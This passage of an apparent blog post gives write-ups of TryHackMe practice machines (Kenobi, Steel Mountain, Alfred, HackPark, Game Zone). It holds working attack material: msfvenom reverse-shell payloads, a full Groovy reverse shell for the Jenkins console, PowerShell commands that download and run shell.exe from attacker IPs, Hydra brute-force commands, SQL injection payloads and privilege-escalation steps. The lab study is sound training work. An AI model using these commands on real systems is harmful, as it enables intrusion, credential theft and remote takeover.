    <p>The web app seems to be useless.</p>
  </li>
  <li>
    <p>This esentially mean that, among other things, port 111 is binding us with a nfs server, this is, a network file system.</p>
  </li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007123851.png" text-align="center" />
</div>

<p>It may be worth to dive in to port 111, so we can use the “showmount” binary to see the directory mount on the NFS server or we use the following scripts:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p111</span> <span class="nt">--script</span><span class="o">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.172.208
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007131247.png" text-align="center" />
</div>

<p>The results shows us that the directory mounted ass entry point is /var.</p>

<p><br /></p>

<ul>
  <li>The scripts runned by default by -A flag shown some useful details about the machine, like that there is account named Kenobi:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007124026.png" text-align="center" />
</div>

<p>we are going to do a SMB or Samba enumeration with nse scripts:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 445 <span class="nt">--script</span><span class="o">=</span>smb-enum-shares.nse,smb-enum-users.nse &lt;IP&gt;
</code></pre></div></div>

<p>The script display that apparently there is a smb share named “anonymous” so in order to take a look on it we are goin to user the smbclient with the ‘guest’ user that no needs any password:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.172.208/anonymous <span class="nt">-U</span> guest
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007125342.png" text-align="center" />
</div>

<p>In the share we found a file; “log.txt” that have indeed information from a SSH key of Kenobi user:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007125652.png" text-align="center" />
</div>

<p>And information about a ProFTPD server:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007125829.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li>Finally, we are going to gain access to the FTP server through a exploit. First, we connect to the FTP server with Netcat:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007131649.png" text-align="center" />
</div>

<p>And we find that the version of the server is 1.3.5. A simple look up in google will lead us to a documented <a href="http://www.proftpd.org/docs/contrib/mod_copy.html">missconfiguration</a> that allow to an unautenticated user to move files between directories of the system.</p>

<p>Thus, we read the documentation of the commands and we log again into the server and move the ssh public key mentioned before of the kenobi user to the /var directory in order to put it in a range of our reach.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007182421.png" text-align="center" />
</div>

<p>Then, we mount the /var/tmp directory to our machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
<span class="nb">ls</span> <span class="nt">-la</span> /mnt/kenobiNFS
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007182717.png" text-align="center" />
</div>

<p>And copy the rsa file into our .ssh directory and log into the machine as kenobi:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007182926.png" text-align="center" />
</div>

<p>Then, only remains the escalation privileges phase. For this, we are going to use the SUID files in combination with modification of the PATH enviroment variable.</p>

<ul>
  <li>In first place there is a binary called menu, propierty of root and with the SUID bit:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007185717.png" text-align="center" />
</div>

<p>This displays a menu that allow to a user to execute certains options (among them are OS commands), like <em>ifconfig</em>:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007185823.png" text-align="center" />
</div>

<ul>
  <li>So we can try to generate a binarie and call it “ifconfig”:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007185937.png" text-align="center" />
</div>

<p>Then, we change the PATH variable to include our home directory first</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007190208.png" text-align="center" />
</div>

<p>And finaly, we give to the file execution perms and execute it through the SUID binary:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221007190313.png" text-align="center" />
</div>

<h3 id="2-advanced-explotation">2. Advanced Explotation.</h3>
<h4 id="21-steel-mountain">2.1. Steel Mountain.</h4>

<p>First, we execute a detailed Nmap port scanning of all ports of the machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">-A</span> &lt;IP&gt;
</code></pre></div></div>

<p>Detailed display (-A), high spped (-T5) and all ports (-p-). The results shown a web application in port 80, due SMB servers in ports 139 and 445, a RDP server in 3389. So far, everithing is expectable but the ports 5985, 8080 &amp; 47001 offer HTTP service with HTTP File Server and Microsoft HTTPAPI servers:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008154640.png" text-align="center" />
</div>

<p>Exploring the various network services the machine offers we got that the server of the HTTPFileServer is a Rejjeto:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008154947.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008155003.png" text-align="center" />
</div>

<p>Thus, we proceed to investigate if exist an exploit to gain access over the machine through this server:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008155352.png" text-align="center" />
</div>

<p>Searching it in metasploit we found a module:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008155501.png" text-align="center" />
</div>

<p>Then, we set up the RHOSTS and RPORT parameter and launch the exploit:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008160443.png" text-align="center" />
</div>

<p>In order to perfom an enumeration of the machine we are going to use the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">Powerup.ps1</a> module to import some commands that would be useful to get sensible information about the system. For achieve this purpouse is a built-in meterpreter command called ‘upload’:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008161428.png" text-align="center" />
</div>

<p>And then, after load powershell in meterpreter with “load powershell”, in a powershell session Import the module and run the Invoke-AllChecks:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008162113.png" text-align="center" />
</div>

<p>We observer that, among all the content that the cmdlet displays, there is a service that appears to have an unquoted executable path vulnerability (and its initiated by LocalSystem which would grant us more privileges and anybody can restart it):</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008162444.png" text-align="center" />
</div>

<p>This consist in a use of the behaviour of autocomplete windows-path feature. If the path isn’t correctly couted Windows understand that the spaces mark parameters of the file to be executed, thus, Windows asume that executable is C:\Programs and the rest are parameters, if the system doesn’t found any executable matching the name, then will complete the path C:\Program Files(x86)\IObit\Advanced.</p>

<p>Thus, if we have writable permissions on the IObit directory we could generate a malware and call it Advanced.exe on the IObit directory making that Windows math our malware with the executable that the services requiere to start. The all we need is to restart correctly the service to make the system run our malware.</p>

<p>First, we make a malicious payload for windows services with MsfVenom:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.207.230 <span class="nv">LPORT</span><span class="o">=</span>4443 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe-service <span class="nt">-o</span> Advanced.exe
</code></pre></div></div>

<p>This command employs the msfvenom utility to make a shell_reverse_tcp for windows with architecture of x86 and format of service executable:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008170314.png" text-align="center" />
</div>

<p>And then we upload it to the correct directory:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008170348.png" text-align="center" />
</div>

<p>Finally, we make a listener in our attack machine and restart the service:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008170557.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221008170616.png" text-align="center" />
</div>

<p>And we have gain full control over the machine.</p>

<p><br /></p>

<p>We could do this without a meterpreter shell using manual powershell commands. The procedure is the same but it will be useful the following commands:</p>

<ul>
  <li><em>Invoke-WebRequest</em> to download files to the victim machine:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">source</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">destination</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><em>Get-Acl</em>, to see writeable permissions of a folder:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">Get-Acl</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\IObit"</span><span class="p">)</span><span class="o">.</span><span class="nf">Access</span><span class="w">
</span></code></pre></div></div>
<p>powershell “(New-Object System.Net.WebClient).Downloadfile(‘http://10.10.233.14:8000/shell.exe’,’shell.exe’)”</p>
<ul>
  <li><em>Restart-Service</em> to restart the service with the unquoted path:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Restart-Service</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<h4 id="22-alfred-hydra-jekins--token-impersonation">2.2. Alfred (Hydra, Jekins &amp; Token Impersonation).</h4>

<p>In this case we are going to face a Windows machine. A por scanning with Nmap</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-T5</span> <span class="nt">-p-</span> &lt;IP&gt;
</code></pre></div></div>

<p>shown us that the machine have two http listening ports offering two web app services through two different web servers:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010094702.png" text-align="center" />
</div>

<p>Researching both web apps we found on which run on port 8080 a login portal:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010095016.png" text-align="center" />
</div>

<p>By the way, mapping the website seems to be useless. So we try to perfom a brute-force attack on the login page with Hydra. First based on some Osint job over the web pages and the web server we made a file with passwords candidates:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010100115.png" text-align="center" />
</div>

<p>And we use it in the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> list.txt <span class="nt">-P</span> list.txt 10.10.179.245 <span class="nt">-s</span> 8080 http-post-form <span class="s2">"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=Submit=Sign+in:Invalid username or password"</span> <span class="nt">-v</span>
</code></pre></div></div>

<p>This command is built following the next stages:</p>

<ul>
  <li>First, we employ the hydra comand and we pass him the list of usernames and passwords to be used with the -L and -P flags. For both we are using the same list.</li>
  <li>Then we pass the IP and, because the web app is offered through a not standard port we add the -s flag to define the port to be used to send the requests.</li>
  <li>Next we define the protocol in which we wanna send the request. Since we are using HTTP we have to select if the method is GET or POST, this can be found in the Inspector &gt; Network and send a login request:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010102533.png" text-align="center" />
</div>

<p>As we see, we must use the POST form so we write ‘http-post-form’ and add between coutes: the login page, the post data, and the error message that the pages displays to indicate an error login try.</p>

<ul>
  <li>The login page can be found by the same way as the we found about the POST method on the “file” field:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010103002.png" text-align="center" />
</div>

<ul>
  <li>The data can be found clickn on the login request on Inspector Network and on the right a window will appears will multiple tabs, on the tab “Params” we can found the parameters that the client request send as data,</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010103256.png" text-align="center" />
</div>

<p>we have to add it to the command separate with ‘&amp;’ and on the username parameter we write the value ^USER^ and on the password ^PASS^</p>

<p>And at last, the error message that can be found sending an error login try:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010103525.png" text-align="center" />
</div>

<p>This will serve to Hydra as a match parameter to catalogate a response as fail. If we don’t localizate correctly this message or we don’t write it correctly Hydra will not find it on any request and in consecuence will mark all the request as valid credentials.</p>

<p>When executing the command we obtain:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010104000.png" text-align="center" />
</div>

<p>So admin:admin are a valid credentials.</p>

<p>No we are in the web app as admins. On the <a href="https://www.jenkins.io/doc/book/managing/script-console/">documentation</a> of Jenkins appears that exists a feature that allows the execution of Groovy scripts. If this feature doesn’t receive adequate security some intruder could execute malicious script.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010165821.png" text-align="center" />
</div>

<p>Thus, we go to <em>Manage Jenkis &gt; Script Console</em> (or simply to the web file /script) and run the following groovy script after we put a netcat listener in our machine:</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s2">"&lt;LocalIP&gt;"</span><span class="o">;</span>
<span class="kt">int</span> <span class="n">port</span><span class="o">=&lt;</span><span class="n">LocalPort</span><span class="o">&gt;;</span>
<span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s2">"cmd.exe"</span><span class="o">;</span>
<span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">start</span><span class="o">();</span><span class="n">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="n">Socket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span><span class="n">port</span><span class="o">);</span><span class="n">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getErrorStream</span><span class="o">(),</span> <span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span><span class="n">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span><span class="k">while</span><span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span><span class="k">while</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">po</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="n">so</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">po</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span><span class="k">try</span> <span class="o">{</span><span class="n">p</span><span class="o">.</span><span class="na">exitValue</span><span class="o">();</span><span class="k">break</span><span class="o">;}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}};</span><span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span><span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010165546.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010165556.png" text-align="center" />
</div>

<p>And we have gained access to the machine. Now, we are going to switch to a meterpreter shell through the C2 enviroment of Metasploit following the steps below.</p>

<ul>
  <li>First we start the Msfconsole to start a multihandler:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010171744.png" text-align="center" />
</div>

<ul>
  <li>Next, we use Msfvenom to create a payload with meterpreter for windows and intiate a python server to download with the victim machine the malicious script:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nt">-a</span> x86 <span class="nt">--encoder</span> x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=[</span>IP] <span class="nv">LPORT</span><span class="o">=[</span>PORT] <span class="nt">-f</span> exe <span class="nt">-o</span> <span class="o">[</span>SHELL NAME].exe<span class="p">;</span> python3 <span class="nt">-m</span> http.server
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010172039.png" text-align="center" />
</div>

<p>And then, we download it with the cmd comand:</p>

<pre><code class="language-cmd">powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.90.103:8000/shell.exe','shell.exe')"
</code></pre>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010172408.png" text-align="center" />
</div>

<ul>
  <li>At last, we initiate the process with powershell:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010172737.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010172748.png" text-align="center" />
</div>

<p>Now, we only have to escalate privilege. We are doing this through <em>Impersionation_token</em> technique. Windows OS employes token to regulate privileges and actions among users. Nevertheless, there are some privileges relationed with the manipulation of the tokens, Windows allows the impersonation because sometimes is necesary to do something in the behalf of other user (like init a service or something of the kind).</p>

<p>If we load a powershell shell and execute the <em>whoami /priv</em> cmdlet we will see the <em>SeImpersonatePrivilege</em> enable:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010180109.png" text-align="center" />
</div>

<p>Then, we proceed to see which tokens are avialable with the cmdlet:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010180402.png" text-align="center" />
</div>

<p>The BUILTIN\Administrator token is avaliable so we can run the cmdlet: <em>impersonate_token “BUILTIN\Administrator”</em>:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010180653.png" text-align="center" />
</div>

<p>To ensure that we indeed gained privileged user, we are going to migrate to a process that is runned by AUTHORITY\SYSTEM, with <em>ps</em> we locate an adecuate process:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010180910.png" text-align="center" />
</div>

<p>And with <em>migrate</em> we in fact migrate to that process:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010181048.png" text-align="center" />
</div>

<p><br /></p>

<h4 id="23-hackpark-hydra-web-access-blogengine-winpeass-hijacking">2.3. HackPark (Hydra, Web access Blogengine, winPEASS, Hijacking).</h4>

<p>In this case we are facing a Windows OS. In a port scanning we can see that it have available a HTTP, RDP, WinRM servers on default ports:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-T5</span> <span class="nt">-sV</span> <span class="nt">-p-</span> &lt;IP&gt;
</code></pre></div></div>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010184433.png" text-align="center" />
</div>

<p>At first, the port 5985 appears to be a web server but a more detailing port scanning over that port reveals that is indeed a WinRM server:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010184440.png" text-align="center" />
</div>

<p>So we proceed to investigate the web page and we find that the page have a comment of <em>Visitor1</em>, is a tribute to the clown <em>Penywise</em> and thta have a login section:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010184706.png" text-align="center" />
</div>

<p>The credentials by default of blogengine.net (admin:Passw@rd123) doesn’t work, thus is a personalizated user. We are going to use a personalizate list of users:</p>

<pre><code class="language-default">Admin
admin
penywise
Penywise
user
User
Visitor1
</code></pre>

<p>An we use this list in the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> /root/list.txt <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 10.10.128.134 http-post-form <span class="s2">"/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=nYpNLTHl95RuU%2BKXvciUT84uGaVvolqEnuw1Ts%2F8AX6IpGI4dlV%2BQY5Hhac3%2FRDvXeUVpELH90g4gPMKngsgCG6NaSDIsEWZOnhd9%2B37MJwQDSkDUVenDUj3QEoOZGJsOp47f0DiBvcSxmBVJlRUNVrmYIBIwlXPqGFvNFffah9FkTfj6FFncz6Aw2oRXzPx2iPOX0YFTCW3Sw0itLGZFkoXoIbKK%2BmZ5k%2BLhmxqloj6Det8Nfa7ZBuulX6Ukxwc3%2FyBpfRaopkvFzfyonu28sWMpv8Sg%2BwsFLeEOBh7XYLhcw4pk0Pv7GpFXbVLilfQhTVUb0Yk5eJy9HXqrhoZ2oghKGdiKFhBS2ynDt0E%2BJKTjNJ%2F&amp;__EVENTVALIDATION=HITidSBLCMzLDxHqA6sSqgn8YHNMwAI%2B4C25XFeNg%2Bce7maOnXO36yE%2BNMUJTfzKopHG1A2q819p7LpXLJ1u%2BZYm0hWhlH35Gykgut6sw%2BJ%2FSQ2yX%2BpjXyhFiOPmiyWVOiGR%2B0sep%2Fp3h%2B6dvowJ5noK0JXpUB8jh6%2FuZ4c97LN3vKH7&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span>
</code></pre></div></div>

<p>The process of the built of the command above is described in the Alfred machine. And then we have this result:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010190901.png" text-align="center" />
</div>

<p>And ike this we can login to the machine as admins with the credentials “admin:1qaz2wsx”. Then, we inspect the web as admin and found the file /admin/about.cshtml in which appears a brief description of the webserver:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010192736.png" text-align="center" />
</div>

<p>This information could lead to an <a href="https://www.exploit-db.com/exploits/46353">exploit</a> which will give us initial access over the machine. We found this an use it. We save the file, open it and change the local IP to match ours:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010193740.png" text-align="center" />
</div>

<p>Following the instructions</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010201219.png" text-align="center" />
</div>

<p>we find that we have to start a listener in our machine that have to be compatible with the parameter that we have modify above and upload the exploit through the “file manager” as PostView.ascx in the web server.</p>

<p>On the Dashboard we go through Post and click on one of them:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010201732.png" text-align="center" />
</div>

<p>And then we click over the File manager</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010201756.png" text-align="center" />
</div>

<p>And upload the file and next click over the just-added icon to incorporate the code to the file:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010202130.png" text-align="center" />
</div>

<p>Next step is found the uploaded file in the following path:</p>

<p>\http://10.10.128.134/?theme=../../App_Data/files/</p>

<p>This is because we are using in fact a Directory Traversal Vulnerabilty since the file is stored in the “App_Data/files” directory, outside the root directory of the web server.</p>

<p>Thus, we go to that direction and trigger the exploit gain initial access.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221010203246.png" text-align="center" />
</div>

<p>Now we have just gained RCE over the server but our shell through netcat is unestable so we’re going to change shell downloading a payload to obtain a shell handled with the C2 enviroment Metasploit.</p>

<p>First, we create a meterpreter reverse shell for windows with the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.90.103 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
</code></pre></div></div>

<p>Then we start the Metasploit enviroment, use a multi/handler and set the parameters PAYLOAD, LHOST, LPORT to match with the set in our payload and run the handler.</p>

<p>Next we initiate a http server with python and use the following powershell command (runned on the cmd) to download on the victim machine the malicious binarie:</p>

<pre><code class="language-cmd">powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.34.76:8000/shell.exe','shell.exe')"
</code></pre>

<p>Then, run the following powershell command to execute the binarie:</p>

<pre><code class="language-cmd">powershell "Start-Process shell.exe"
</code></pre>

<p>And we have gained a meterpreter shell in the victim machine:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011090052.png" text-align="center" />
</div>

<p>Then, in order to do enumeration job we are going to use the enumeration oriented script <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winPEAS</a>. We have first to upload the binarie (from the binarie folder) and execute it:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011104000.png" text-align="center" />
</div>

<p>WinPEAS offer us some important details like the existance of a folder holding the dependencies of a service (SystemScheduler) that is worldwritable:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011104124.png" text-align="center" />
</div>

<p>Thus, we can perfom a Service Windows Privilege escalation attack. If we go to the C:\Program Files x(86)\SystemScheduler folder and open the logs we can see that the Administrator start the Message.exe binary often in time:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011124132.png" text-align="center" />
</div>

<p>So we can substitute the Message.exe with a malicious binary created with MSFVenom:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011124250.png" text-align="center" />
</div>

<p>And exit the meterpreter session and open other to handle the conection triggered by the new binary from the Administrator account:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011124337.png" text-align="center" />
</div>

<p>Remember that we can store the session with Ctrl+Z instead of kill the session with Ctrl+C this allow us to return in the future if we need it.</p>

<p><br /></p>

<h4 id="24-game-zonesql-injection-hash-identifier-johntheripper-ssh-tunneling-metasploit">2.4. Game Zone(SQL Injection, Hash-identifier, JohnTheRipper, SSH Tunneling, Metasploit)</h4>

<p>In this case we are facing a Linux server that, according pour port scanning with nmap (nmap -T5 -p- -A), have SSH and HTTP servers listening on default ports:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011145944.png" text-align="center" />
</div>

<p>We access to the web page and see that it have a login fields and a search bar that could be vulnerable to SQL-injection:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011150215.png" text-align="center" />
</div>

<p>Once we tried over the username field a SQL Query payload (‘ or 1=1 – -) we are redirected to /portal.php file that allo us to search for a game:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011151012.png" text-align="center" />
</div>

<p>This could be vulnerable to SQL injection so to ensure this posibility we are going to use the tool SQLmap. The easiest way to doing this, since the method is a HTTP-POST parameter is within the body of the POST request, is to use an auxiliary tool like BurpSuite to catch the request and save its contents into a file (file.txt) and employ it in the next command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"http://&lt;IP&gt;"</span> <span class="nt">-r</span> file.txt &lt;Instruction&gt;
</code></pre></div></div>

<p>Generally, the data is stored in a DBMS (Data Base Management System) that holds multiple databases that at the same time hosts various tables conform of columns and rows.</p>

<p>Thus, the first instruction for Sqlmap is to display the avaliable databases on the DBMS with the instruction: <em>–dbs</em></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011153958.png" text-align="center" />
</div>

<p>Then, the <em>db</em> is suggestive, to dump the tables on this database we use the instruction: <em>-D db –tables</em></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011154105.png" text-align="center" />
</div>

<p>And to open the contents of the table users we use: <em>-D de -T users –dump</em></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221011154207.png" text-align="center" />
</div>

<p>Then we have obtained a user and a hash, we’re going to crack this hash with JohnTheRipper.</p>

<p>First, we use, hash-identifier to identifie the type of hasht to make easier the job to John:</p>

